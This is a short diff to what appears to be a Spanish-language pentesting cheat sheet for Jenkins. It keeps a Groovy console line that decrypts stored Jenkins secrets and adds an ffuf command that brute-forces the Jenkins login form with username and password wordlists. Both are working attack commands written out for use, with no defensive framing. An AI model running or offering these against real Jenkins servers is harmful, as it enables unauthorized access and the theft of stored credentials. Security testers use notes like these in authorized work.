@@ -21,3 +21,15 @@ En el console de groovy
 ```bash
 println(hudson.util.Secret.decrypt("VALOR_ENTRE_CORCHETES"))
 ```
+
+
+
+fuerza bruta:
+ffuf -u http://target:8080/j_acegi_security_check \
+  -X POST \
+  -d "j_username=FUZZ1&j_password=FUZZ2&from=%2F&Submit=Sign+in" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -w users.txt:FUZZ1 -w passwords.txt:FUZZ2 \
+  -fc 401
+
+
